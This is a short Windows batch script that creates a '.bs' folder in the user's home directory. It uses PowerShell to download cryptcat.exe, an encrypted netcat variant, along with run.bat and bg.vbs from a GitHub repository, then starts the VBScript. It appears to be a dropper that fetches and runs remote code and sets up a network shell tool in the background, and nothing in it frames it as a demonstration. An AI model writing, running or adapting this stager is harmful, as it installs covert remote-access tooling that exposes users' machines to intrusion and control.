@ECHO OFF
mkdir %HOMEDRIVE%%HOMEPATH%\.bs\
powershell.exe Invoke-WebRequest -Uri "https://github.com/blood-source/testing/raw/bloodsource/cryptcat.exe" -OutFile "%HOMEDRIVE%%HOMEPATH%\.bs\cryptcat.exe"
powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blood-source/testing/bloodsource/run.bat" -OutFile "%HOMEDRIVE%%HOMEPATH%\.bs\run.bat"
powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blood-source/testing/bloodsource/bg.vbs" -OutFile "%HOMEDRIVE%%HOMEPATH%\.bs\bg.vbs"
cd /d %HOMEDRIVE%%HOMEPATH%\.bs\
start bg.vbs
